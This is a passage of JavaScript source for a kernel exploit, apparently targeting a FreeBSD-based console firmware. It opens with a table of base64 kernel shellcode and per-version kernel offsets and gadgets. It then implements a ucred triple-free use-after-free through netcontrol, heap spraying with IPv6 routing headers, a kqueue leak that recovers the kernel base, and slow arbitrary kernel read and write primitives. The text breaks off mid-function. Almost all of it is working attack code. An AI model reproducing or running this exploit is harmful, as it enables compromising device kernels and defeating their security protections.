            SYSENT_661: 0x110A980,
            JMP_RSI_GADGET: 0x68B1,
            KL_LOCK: 0x45B10
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYETMCEAuOsEAABBuesAAABBuusAAABmiYHsskcAQbvrAAAAuJDp//9IgcItDAUAZomxIzAhAGaJuUMwIQBmRImBtH1iAMaBzQoAAOvGgb1yDQDrxoEBcw0A68aBfXMNAOvGgcFzDQDrxoFtdQ0A68aBHXoNAOvGge16DQDrZkSJiZ+GYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgcbBCADrZomB1CohAMeBiDAhAJDpPAHHgWCrLQBIMcDDxoEqxBkAN8aBLcQZADfHgdArEAECAAAASImR2CsQAceB/CsQAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYHxyTQAuOsGAAC/BQAAAGaJgTPKNABBugEAAABIuEGDv6AEAAAAQbsBAAAASImBO8o0ALgEAAAAZomBTco0ALhJi///x4FJyjQASYuH0MaBT8o0AADHgVbKNABJi7ewZomRWso0AMaBXMo0AADHgW7KNABJi4dAZomxcso0AMaBdMo0AADHgXvKNABJi7cgZom5f8o0AMaBgco0AADHgZPKNABJjb/AZkSJgZfKNADGgZnKNAAAx4GfyjQASY2/4GZEiYmjyjQAxoGlyjQAAMeBsso0AEmNvwBmRImRtso0AMaBuMo0AADHgb7KNABJjb8gZkSJmcLKNADGgcTKNAAAZomBz8o0AMaB0co0AP8PIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x110A5B0,
            JMP_RSI_GADGET: 0x50DED,
            KL_LOCK: 0x25E330
        }
    }, 
    11: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYEzTB4AuOsEAABBuesAAABBuusAAABmiYHsyDUAQbvrAAAAuJDp//9IgcJhGAcAZomxQ0weAGaJuWNMHgBmRImBZD9iAMaBzQoAAOvGgT3dLQDrxoGB3S0A68aB/d0tAOvGgUHeLQDrxoHt3y0A68aBneQtAOvGgW3lLQDrZkSJiU9IYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVQwDrZomB9EYeAMeBqEweAJDpPAHHgeCMCABIMcDDxoFqYhUAN8aBbWIVADfHgXAZEAECAAAASImReBkQAceBnBkQAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYGx2zAAuOsGAAC/BQAAAGaJgfPbMABBugEAAABIuEGDv6AEAAAAQbsBAAAASImB+9swALgEAAAAZomBDdwwALhJi///x4EJ3DAASYuH0MaBD9wwAADHgRbcMABJi7ewZomRGtwwAMaBHNwwAADHgS7cMABJi4dAZomxMtwwAMaBNNwwAADHgTvcMABJi7cgZom5P9wwAMaBQdwwAADHgVPcMABJjb/AZkSJgVfcMADGgVncMAAAx4Ff3DAASY2/4GZEiYlj3DAAxoFl3DAAAMeBctwwAEmNvwBmRImRdtwwAMaBeNwwAADHgX7cMABJjb8gZkSJmYLcMADGgYTcMAAAZomBj9wwAMaBkdwwAP8PIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x1109350,
            JMP_RSI_GADGET: 0x71A21,
            KL_LOCK: 0x58F10,
        },
        2: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYFTTB4AuOsEAABBuesAAABBuusAAABmiYEMyTUAQbvrAAAAuJDp//9IgcJhGAcAZomxY0weAGaJuYNMHgBmRImBBD9iAMaBzQoAAOvGgV3dLQDrxoGh3S0A68aBHd4tAOvGgWHeLQDrxoEN4C0A68aBveQtAOvGgY3lLQDrZkSJie9HYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgbYUQwDrZomBFEceAMeByEweAJDpPAHHgeCMCABIMcDDxoGKYhUAN8aBjWIVADfHgXAZEAECAAAASImReBkQAceBnBkQAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYHR2zAAuOsGAAC/BQAAAGaJgRPcMABBugEAAABIuEGDv6AEAAAAQbsBAAAASImBG9wwALgEAAAAZomBLdwwALhJi///x4Ep3DAASYuH0MaBL9wwAADHgTbcMABJi7ewZomROtwwAMaBPNwwAADHgU7cMABJi4dAZomxUtwwAMaBVNwwAADHgVvcMABJi7cgZom5X9wwAMaBYdwwAADHgXPcMABJjb/AZkSJgXfcMADGgXncMAAAx4F/3DAASY2/4GZEiYmD3DAAxoGF3DAAAMeBktwwAEmNvwBmRImRltwwAMaBmNwwAADHgZ7cMABJjb8gZkSJmaLcMADGgaTcMAAAZomBr9wwAMaBsdwwAP8PIMBIDQAAAQAPIsAxwMM="
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYGsvi8AQbvrAAAAuJDp//9IgcIVAwcAZomxs3YbAGaJudN2GwBmRImBtHhiAMaBzQoAAOvGge3SKwDrxoEx0ysA68aBrdMrAOvGgfHTKwDrxoGd1SsA68aBTdorAOvGgR3bKwDrZkSJiZ+BYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgaYSOQDrZomBZHEbAMeBGHcbAJDpPAHHgSDWOwBIMcDDxoE6ph8AN8aBPaYfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x110A760,
            JMP_RSI_GADGET: 0x704D5,
            KL_LOCK: 0xE6C20
        }
    }, 
    12: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYHswC8AQbvrAAAAuJDp//9IgcJxeQQAZomxs3YbAGaJudN2GwBmRImB9HpiAMaBzQoAAOvGgc3TKwDrxoER1CsA68aBjdQrAOvGgdHUKwDrxoF91isA68aBLdsrAOvGgf3bKwDrZkSJid+DYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgeYUOQDrZomBZHEbAMeBGHcbAJDpPAHHgWDYOwBIMcDDxoEapx8AN8aBHacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=",
            JMP_RSI_GADGET: 0x47B31
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYEswS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBNHtiAMaBzQoAAOvGgQ3UKwDrxoFR1CsA68aBzdQrAOvGgRHVKwDrxoG91isA68aBbdsrAOvGgT3cKwDrZkSJiR+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgaDYOwBIMcDDxoFapx8AN8aBXacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
        }
    }, 
    13: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM="
        }
    }
}
//#endregion
//#region Functions
function get_rthdr(sock, sz) {
    view(leak_rthdr0_len_addr).setInt32(0, sz, true);
    if (getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0.addr, leak_rthdr0_len_addr).eq(-1)) {
        throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
    }
}

function set_rthdr(sock) {
    if (setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr0.addr, spray_rthdr0_len).eq(-1)) {
        throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
    }
}

function free_rthdr(sock) {
    if (setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
    }
}

function netcontrol_set_queue(sock) {
    var sz = 8;
    var addr = alloc(sz);
    view(addr).setInt32(0, sock, true);

    if (netcontrol.invoke(-1, NET_CONTROL_NETEVENT_SET_QUEUE, addr, sz).eq(-1)) {
        throw new SyscallError(`Unable to set ${sock} in netevent queue !!`);
    }
}

function netcontrol_clear_queue(sock) {
    var sz = 8;
    var addr = alloc(sz);
    view(addr).setInt32(0, sock, true);

    if (netcontrol.invoke(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, addr, sz).eq(-1)) {
        throw new SyscallError(`Unable clear ${sock} from netevent queue !!`);
    }
}

function find_twins() {
    for (var i = 0; i < FIND_TWINS_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            spray_rthdr0.ip6r0_reserved = j;

            for (var k = 0; k < rthdr_tag.length; k++) {
                spray_rthdr0.ip6r0_slmap.put(k, rthdr_tag[k]);
            }

            set_rthdr(ipv6_socks[j]);
        }

        for (var j = 0; j < ipv6_socks.length; j++) {
            get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);

            var match = true;
            for (var k = 0; k < rthdr_tag.length; k++) {
                if (leak_rthdr0.ip6r0_slmap.at(k) !== rthdr_tag[k]) {
                    match = false;
                    break;
                }
            }

            if (match && j !== leak_rthdr0.ip6r0_reserved) {
                debug(`Found twins after ${i} iterations !!`);
                twins[0] = ipv6_socks[j];
                twins[1] = ipv6_socks[leak_rthdr0.ip6r0_reserved];
                return;
            }
        }
    }

    throw new Error("Unable to find twins !!");
}

function find_triplet(master, slave) {
    for (var i = 0; i < FIND_TRIPLET_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            if (ipv6_socks[j] === master || ipv6_socks[j] === slave) {
                continue;
            }

            spray_rthdr0.ip6r0_reserved = j;
            
            for (var k = 0; k < rthdr_tag.length; k++) {
                spray_rthdr0.ip6r0_slmap.put(k, rthdr_tag[k]);
            }

            set_rthdr(ipv6_socks[j]);
        }

        get_rthdr(master, ip6_rthdr0.sizeof);

        var match = true;
        for (var j = 0; j < rthdr_tag.length; j++) {
            if (leak_rthdr0.ip6r0_slmap.at(j) !== rthdr_tag[j]) {
                match = false;
                break;
            }
        }

        var sock = ipv6_socks[leak_rthdr0.ip6r0_reserved];

        if (match && sock !== master && sock !== slave) {
            debug(`Found triplet after ${i} iterations !!`);
            return sock;
        }
    }

    throw new Error("Unable to find triplet !!");
}

function init() {
    log("Environment init started...");

    tmp = alloc(PAGE_SIZE);

    var in6_count = (UCRED_SIZE - ip6_rthdr0.sizeof) / in6_addr.sizeof;

    // Prepare spray/leak rthdr0
    spray_rthdr0_len = ip6_rthdr0.sizeof + (in6_addr.sizeof * in6_count);
    leak_rthdr0_len_addr = alloc(4);

    var spray_rthdr0_addr = alloc(spray_rthdr0_len);
    spray_rthdr0 = ip6_rthdr0.from(spray_rthdr0_addr);

    var leak_rthdr0_addr = alloc(spray_rthdr0_len);
    leak_rthdr0 = ip6_rthdr0.from(leak_rthdr0_addr);

    spray_rthdr0.ip6r0_nxt = 0;
    spray_rthdr0.ip6r0_len = in6_count * 2;
    spray_rthdr0.ip6r0_type = 0;
    spray_rthdr0.ip6r0_segleft = in6_count;

    // Prepare msg iov
    var msg_iov_addr = alloc(iovec.sizeof * MSG_IOV_NUM);
    msg_iov = iovec.from(msg_iov_addr);
    msg_uio = uio.from(msg_iov_addr);

    var msg_addr = alloc(msghdr.sizeof);
    msg = msghdr.from(msg_addr);

    msg.msg_iov = msg_iov.addr;
    msg.msg_iovlen = MSG_IOV_NUM;

    var uio_iov_read_addr = alloc(iovec.sizeof * UIO_IOV_NUM);
    uio_iov_read = iovec.from(uio_iov_read_addr);

    var uio_iov_write_addr = alloc(iovec.sizeof * UIO_IOV_NUM);
    uio_iov_write = iovec.from(uio_iov_write_addr);

    var dummy_sz = 0x1000;
    var dummy_addr = alloc(dummy_sz);

    bset(dummy_addr, dummy_sz, 0x41);

    uio_iov_read.iov_base = dummy_addr;
    uio_iov_write.iov_base = dummy_addr;

    // Prepare workers
    var uio_worker_ctx_addr = alloc(worker_ctx.sizeof);

    uio_worker = new Worker(uio_worker_ctx_addr, uio_threads.length);

    debug(`uio_worker_ctx_addr: ${uio_worker_ctx_addr}`);

    log("Environment init completed !!");
};

function cleanup() {
    log("Environment cleanup started...");

    for (var i = 0; i < ipv6_socks.length; i++) {
        if (ipv6_socks[i] === 0) {
            continue;
        }

        if (close.invoke(ipv6_socks[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${ipv6_socks[i]} !!`);
        }
    }

    for (var i = 0; i < uio_ss.length; i++) {
        if (uio_ss[i] === 0) {
            continue;
        }

        if (close.invoke(uio_ss[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${uio_ss[i]} !!`);
        }
    }

    if (typeof kv === "undefined") {
        for (var i = 0; i < master_pipe.length; i++) {
            if (master_pipe[i] === 0) {
                continue;
            }

            if (close.invoke(master_pipe[i]).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${master_pipe[i]} !!`);
            }
        }
        
        for (var i = 0; i < slave_pipe.length; i++) {
            if (slave_pipe[i] === 0) {
                continue;
            }

            if (close.invoke(slave_pipe[i]).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${slave_pipe[i]} !!`);
            }
        }
    }

    debug("Signaling stop to uio threads...");

    uio_worker.signal_work(COMMAND_SHUTDOWN);
    if (sched_yield.invoke().eq(-1)) {
        throw new SyscallError("Unable to yield scheduler !!");
    }

    for (var i = 0; i < uio_threads.length; i++) {
        uio_threads[i].join();

        debug(`${uio_threads[i].name} returned`);
        debug(`exception: ${uio_threads[i].exception}`);
        debug(`return: ${uio_threads[i].ret}`);
    }

    debug("uio threads stopped !!");

    uio_worker.free();

    log("Environment cleanup completed !!");
};

function setup() {
    log("Environment setup started...");

    var pair_addr = alloc(8);

    // Create socket pair for uio spraying
    if (socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create uio socket pair !!");
    }

    uio_ss[0] = view(pair_addr).getInt32(0, true);
    uio_ss[1] = view(pair_addr).getInt32(4, true);

    if (pipe.invoke(pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create pipe !!");
    }

    master_pipe[0] = view(pair_addr).getInt32(0, true);
    master_pipe[1] = view(pair_addr).getInt32(4, true);

    if (pipe.invoke(pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create pipe !!");
    }

    slave_pipe[0] = view(pair_addr).getInt32(0, true);
    slave_pipe[1] = view(pair_addr).getInt32(4, true);

    debug(`uio_ss: ${uio_ss}`);
    debug(`master_pipe: ${master_pipe}`);
    debug(`slave_pipe: ${slave_pipe}`);

    dispose(pair_addr);

    var userland = read_file_str("/download0/userland.js");
    var utils = read_file_str("/download0/ntctrl_utils.js");

    debug("Spawn uio threads..");

    var uio_start = `
        var UIO_IOV_NUM = 0x14;

        var writev = new NativeFunction(0x79, "bigint");
        var readv = new NativeFunction(0x78, "bigint");

        var uio_worker_ctx_addr = new BigInt("${uio_worker.ctx.addr}");
        var uio_worker = new Worker(uio_worker_ctx_addr);

        var uio_iov_read_addr = new BigInt("${uio_iov_read.addr}");
        var uio_iov_write_addr = new BigInt("${uio_iov_write.addr}");
        var uio_ss = [${uio_ss[0]}, ${uio_ss[1]}];

        try {
            while (true) {
                var cmd = uio_worker.wait_for_work();
                if (cmd === COMMAND_SHUTDOWN) {
                    break;
                }

                switch(cmd) {
                  case COMMAND_UIO_READ:
                        if (writev.invoke(uio_ss[1], uio_iov_read_addr, UIO_IOV_NUM).eq(-1)) {
                            throw new SyscallError(\`Unable to write vector of size \${UIO_IOV_NUM} to fd \${uio_ss[1]} !!\`);
                        }
                        break;
                  case COMMAND_UIO_WRITE:
                        if (readv.invoke(uio_ss[0], uio_iov_write_addr, UIO_IOV_NUM).eq(-1)) {
                            throw new SyscallError(\`Unable to read vector of size \${UIO_IOV_NUM} to fd \${uio_ss[0]} !!\`);
                        }
                        break;
                }

                uio_worker.signal_finished();
            }
        } catch(e) {
            notify(\`\${thrd_name} Error: \${e.message}\`); 
        }
    `;

    // Create uio threads
    for (var i = 0; i < uio_threads.length; i++) {
        var name = `uio_thread_${i}`;
        var script = userland + `\n\nvar thrd_name = "${name}";` + utils + uio_start;

        uio_threads[i] = new JSThread(name, script);
        uio_threads[i].execute();
    }

    debug("uio threads spawned !!");

    log("Environment setup completed !!");
}

function ucred_triple_free() {
    log("Ucred triple free started...");

    // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt
    msg_iov.iov_base = 1;
    msg_iov.iov_len = 1;

    // Create dummy socket to be registered and then closed
    var dummy_sock = socket.invoke(AF_UNIX, SOCK_STREAM, 0);
    if (dummy_sock.eq(-1)) {
        throw new SyscallError("Unable to create socket !!");
    }
    
    debug(`dummy_sock: ${dummy_sock}`);
    
    // Register dummy socket
    netcontrol_set_queue(dummy_sock);
    
    // Close the dummy socket
    if (close.invoke(dummy_sock).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
    }
    
    // Allocate a new ucred
    if (setuid.invoke(1).eq(-1)) {
        throw new SyscallError("Unable to set uid to 1 !!");
    }
    
    // Reclaim dummy_sock fd
    uaf_sock = socket.invoke(AF_UNIX, SOCK_STREAM, 0);
    if (uaf_sock.eq(-1)) {
        throw new SyscallError("Unable to create socket !!");
    }
    
    debug(`uaf_sock: ${uaf_sock}`);
    
    if (uaf_sock.neq(dummy_sock)) {
        throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
    }
    
    // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
    if (setuid.invoke(1).eq(-1)) {
        throw new SyscallError("Unable to set uid to 1 !!");
    }
    
    // Unregister dummy socket and free the file and ucred
    netcontrol_clear_queue(uaf_sock);

    log("Spraying kmalloc heap...");

    // Set cr_refcnt back to 1
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        sendmsg.invoke(0, msg.addr, 0);
    }
    
    // Double free ucred.
    // Note: Only dup works because it does not check f_hold
    var uaf_sock_dup = dup.invoke(uaf_sock);
    if (uaf_sock_dup.eq(-1)) {
        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
    }
    
    if (close.invoke(uaf_sock_dup).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
    }
    
    log("Looking for twins...");

    // Find twins
    find_twins();
    
    log(`Found twins: ${twins} !!`);

    log("Triple freeing...");

    free_rthdr(twins[1]);

    var reclaimed = false;

    // Set cr_refcnt back to 1
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        sendmsg.invoke(0, msg.addr, 0);

        get_rthdr(twins[0], ip6_rthdr0.sizeof);

        if (leak_rthdr0.ip6r0_nxt === 1) {
            debug(`Set cr_refcnt back to 1 after ${i} iterations !!`);
            reclaimed = true;
            break;
        }
    }

    if (!reclaimed) {
        throw new Error("Unable to set cr_refcnt back to 1 !!");
    }

    triplets[0] = twins[0];

    // Triple free ucred.
    var uaf_sock_dup = dup.invoke(uaf_sock);
    if (uaf_sock_dup.eq(-1)) {
        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
    }

    if (close.invoke(uaf_sock_dup).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
    }

    log("Looking for triplets...");

    triplets[1] = find_triplet(triplets[0], -1);
    triplets[2] = find_triplet(triplets[0], triplets[1]);

    log(`Found triplet: ${triplets} !!`);

    log("Ucred triple free completed !!");
}

function leak_kqueue() {
    log("Leak kqueue started...");

    free_rthdr(triplets[1]);

    var leaked = false;
    for (var i = 0; i < LEAK_KQUEUE_NUM; i++) {
        var kq = kqueue.invoke();
        if (kq.eq(-1)) {
            throw new SyscallError("Unable to get kqueue !!");
        }

        get_rthdr(triplets[0], KQUEUE_SIZE);

        var kq_hdr = view(leak_rthdr0.addr).getInt32(8, true);
        if (kq_hdr === 0x1430000) {
            debug(`Leaked kqueue after ${i} iterations !!`);
            leaked = true;
            break;
        }

        if (close.invoke(kq).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${kq} !!`);
        }
    }

    if (!leaked) {
        throw new Error("Unable to leak kqueue !!");
    }

    log("Leaked kqueue !!");

    kl_lock = view(leak_rthdr0.addr).getBigInt(0x60, true);
    kq_fdp = view(leak_rthdr0.addr).getBigInt(0x98, true);
    kernel_base = kl_lock.sub(KernelMisc.KL_LOCK(version));

    debug(`kq_fdp: ${kq_fdp}`);
    debug(`kl_lock: ${kl_lock}`);

    log(`kernel base: ${kernel_base}`);

    // Close kqueue to free buffer
    if (close.invoke(kq).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${kq} !!`);
    }

    triplets[1] = find_triplet(triplets[0], triplets[2]);

    debug(`Found triplet: ${triplets} !!`);

    log("Leak kqueue completed !!");
}

function kread_slow(addr, sz) {
    // Prepare leak buffers
    var leak_bufs = new Array(uio_threads.length);
    for (var i = 0; i < leak_bufs.length; i++) {
        leak_bufs[i] = alloc(sz);
    }

    // Set send buf size
    var buf_sz_addr = alloc(4);
    view(buf_sz_addr).setInt32(0, sz, true);

    if (setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
    }

    // Fill queue
    if (write.invoke(uio_ss[1], tmp, sz).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
    }

    // Set iov length
    uio_iov_read.iov_len = sz;

    // Free one
    free_rthdr(triplets[1]);

    debug("Signaling work to uio threads...");

    var reclaimed = false;

    // Reclaim with uio
    for (var i = 0; i < SPRAY_UIO_NUM; i++) {
        uio_worker.signal_work(COMMAND_UIO_READ);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        // Leak with other rthdr
        get_rthdr(triplets[0], iovec.sizeof);

        var iov_len = view(leak_rthdr0.addr).getInt32(8, true);
        if (iov_len === UIO_IOV_NUM) {
            debug(`Reclaim with uio after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Wake up all threads
        if (read.invoke(uio_ss[0], tmp, sz).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
        }

        for (var j = 0; j < leak_bufs.length; j++) {
            if (read.invoke(uio_ss[0], leak_bufs[j], sz).eq(-1)) {
                throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
            }
        }

        uio_worker.wait_for_finished();

        // Fill queue
        if (write.invoke(uio_ss[1], tmp, sz).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
        }
    }

    debug("uio threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to reclaim with uio !!");
    }

    var uio_iov = view(leak_rthdr0.addr).getBigInt(0, true);

    // Prepare uio reclaim buffer
    msg_uio.uio_iov = uio_iov;
    msg_uio.uio_iovcnt = UIO_IOV_NUM;
    msg_uio.uio_offset = -1;
    msg_uio.uio_resid = sz;
    msg_uio.uio_segflg = UIO_SYSSPACE;
    msg_uio.uio_rw = UIO_WRITE;
    msg_uio.uio_td = 0;

    msg_iov.from_at(3).iov_base = addr;
    msg_iov.from_at(3).iov_len = sz;

    // Free second one
    free_rthdr(triplets[2]);

    reclaimed = false;

    // Reclaim uio with iov
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        sendmsg.invoke(0, msg.addr, 0);

        // Leak with other rthdr
        get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

        var uio_segflg = view(leak_rthdr0.addr).getInt32(0x20, true);
        if (uio_segflg === UIO_SYSSPACE) {
            debug(`Reclaim uio with iov after ${i} iterations !!`);
            reclaimed = true;
            break;
        }
    }

    if (!reclaimed) {
        throw new Error("Unable to reclaim uio with iov !!");
    }

    // Wake up all threads
    if (read.invoke(uio_ss[0], tmp, sz).eq(-1)) {
        throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
    }
    
    // Read the results now
    var leak_buf;

    // Get leak
    var spray_val = new BigInt("0x4141414141414141");
    for (var i = 0; i < leak_bufs.length; i++) {
        if (read.invoke(uio_ss[0], leak_bufs[i], sz).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
        }

        var val = view(leak_bufs[i]).getBigInt(0, true);
        if (val.neq(spray_val)) {
            triplets[1] = find_triplet(triplets[0], -1);

            leak_buf = leak_bufs[i];
            break;
        }
    }

    uio_worker.wait_for_finished();

    triplets[2] = find_triplet(triplets[0], triplets[1]);

    debug(`Found triplet: ${triplets} !!`);

    if (typeof leak_buf === "undefined") {
        throw new Error(`Unable to kread ${addr} !!`);
    }

    return leak_buf;
}

function kwrite_slow(dst, src, sz) {
    // Set send buf size
    var buf_sz_addr = alloc(4);
    view(buf_sz_addr).setInt32(0, sz, true);

    if (setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
    }
    
    // Set iov length
    uio_iov_write.iov_len = sz;

    // Free one
    free_rthdr(triplets[1]);

    debug("Signaling work to uio threads...");

    var reclaimed = false;

    // Reclaim with uio
    for (var i = 0; i < SPRAY_UIO_NUM; i++) {
        uio_worker.signal_work(COMMAND_UIO_WRITE);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        // Leak with other rthdr
        get_rthdr(triplets[0], iovec.sizeof);

        var iov_len = view(leak_rthdr0.addr).getInt32(8, true);
        if (iov_len === UIO_IOV_NUM) {
            debug(`Reclaim with uio after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Wake up all threads
        for (var j = 0; j < uio_threads.length; j++) {
            if (write.invoke(uio_ss[1], src, sz).eq(-1)) {
                throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
            }
        }

        uio_worker.wait_for_finished();
    }

    debug("uio threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to reclaim with uio !!");
    }

    var uio_iov = view(leak_rthdr0.addr).getBigInt(0, true);

    // Prepare uio reclaim buffer
    msg_uio.uio_iov = uio_iov;
    msg_uio.uio_iovcnt = UIO_IOV_NUM;
    msg_uio.uio_offset = -1;
    msg_uio.uio_resid = sz;
    msg_uio.uio_segflg = UIO_SYSSPACE;
    msg_uio.uio_rw = UIO_READ;
    msg_uio.uio_td = 0;

    msg_iov.from_at(3).iov_base = dst;
    msg_iov.from_at(3).iov_len = sz;

    // Free second one
    free_rthdr(triplets[2]);

    reclaimed = false;

    // Reclaim uio with iov
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        sendmsg.invoke(0, msg.addr, 0);

        // Leak with other rthdr
